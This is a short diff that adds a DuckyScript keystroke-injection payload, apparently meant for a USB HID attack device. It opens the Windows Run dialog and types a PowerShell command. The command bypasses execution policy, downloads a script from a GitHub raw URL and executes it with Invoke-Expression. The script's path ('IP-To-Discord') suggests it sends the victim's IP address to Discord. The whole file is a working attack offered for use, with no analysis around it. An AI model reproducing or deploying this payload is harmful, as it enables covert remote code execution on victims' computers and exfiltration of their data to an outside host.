@@ -1,0 +1,6 @@
+REM
+DELAY 200
+GUI r
+DELAY 50
+ALTSTRING powershell -ExecutionPolicy Bypass -Command "& {Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/dyl4nz/powershell/main/IP-To-Discord/IP.ps1'))}"
+ENTER
